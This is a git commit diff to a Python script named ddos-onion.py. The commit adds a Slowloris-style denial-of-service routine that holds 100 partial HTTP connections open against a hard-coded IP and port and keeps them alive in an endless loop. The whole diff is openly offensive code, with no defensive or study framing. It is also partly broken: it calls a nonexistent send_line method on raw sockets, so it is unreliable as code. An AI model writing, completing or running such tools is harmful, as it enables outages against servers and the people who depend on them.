aa08ad71f914754ab8219ef1c71a7151446006db
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2023-12-01 09:21:35 +0100

    Update ddos-onion.py

--- ddos-onion.py
+++ ddos-onion.py
@@ -12,47 +12,68 @@ DEFAULT_SOCK_TIMEOUT = 4
 def generate_fake_identity():
     return "Anonymous"
 
-# ... (other functions)
-
-def send_line(self, line, identity):
+def send_line(s, line, identity):
     line = f"{line}\r\n"
-    self.send(line.encode("utf-8"))
-    self.send_line(f"X-Identity: {identity}")
+    s.send(line.encode("utf-8"))
+    s.send_line(f"X-Identity: {identity}")
 
-# ... (other functions)
-
-def init_socket(ip: str, args, identity):
+def init_socket(ip: str, port, identity):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(DEFAULT_SOCK_TIMEOUT)
 
-    if args.https:
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        s = ctx.wrap_socket(s, server_hostname=args.host)
-
-    s.connect((ip, args.port))
+    s.connect((ip, port))
 
     s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1", identity)
 
     ua = DEFAULT_USER_AGENTS[0]
-    if args.randuseragent:
-        ua = random.choice(DEFAULT_USER_AGENTS)
+    s.send_line(f"User-Agent: {ua}", identity)
+    s.send_line("Accept-language: en-US,en,q=0.5", identity)
 
-    s.send_header("User-Agent", ua)
-    s.send_header("Accept-language", "en-US,en,q=0.5")
     return s
 
-# ... (other functions)
+def slowloris_iteration(list_of_sockets):
+    logging.debug("Sending keep-alive headers...")
+
+    identity = generate_fake_identity()
+
+    for s in list(list_of_sockets):
+        try:
+            send_line(s, "X-a: {}".format(random.randint(1, 5000)), identity)
+        except socket.error:
+            list_of_sockets.remove(s)
+
+    diff = 100 - len(list_of_sockets)  # Adjust the desired number of connections as needed
+
+    if diff <= 0:
+        return
+
+    logging.debug("Creating %s new sockets...", diff)
+    for _ in range(diff):
+        try:
+            s = init_socket("192.168.1.1", 80, identity)  # Replace with your target IP and port
+            list_of_sockets.append(s)
+        except socket.error as e:
+            logging.debug("Failed to create new socket: %s", e)
+            break
 
 def ddos_onion():
-    # Main function of the program
     logging.basicConfig(level=logging.DEBUG)
-    logging.debug("Hello, ddos-onion!")
 
-    # Replace the following line with your actual logic
-    logging.debug("Add your actual code here")
+    target_ip = "192.168.1.1"
+    target_port = 80
+
+    list_of_sockets = []
+
+    for _ in range(100):  # Number of initial connections
+        try:
+            s = init_socket(target_ip, target_port, generate_fake_identity())
+            list_of_sockets.append(s)
+        except socket.error as e:
+            logging.debug("Failed to create new socket: %s", e)
+            break
+
+    while True:
+        slowloris_iteration(list_of_sockets)
 
 if __name__ == "__main__":
     ddos_onion()
-
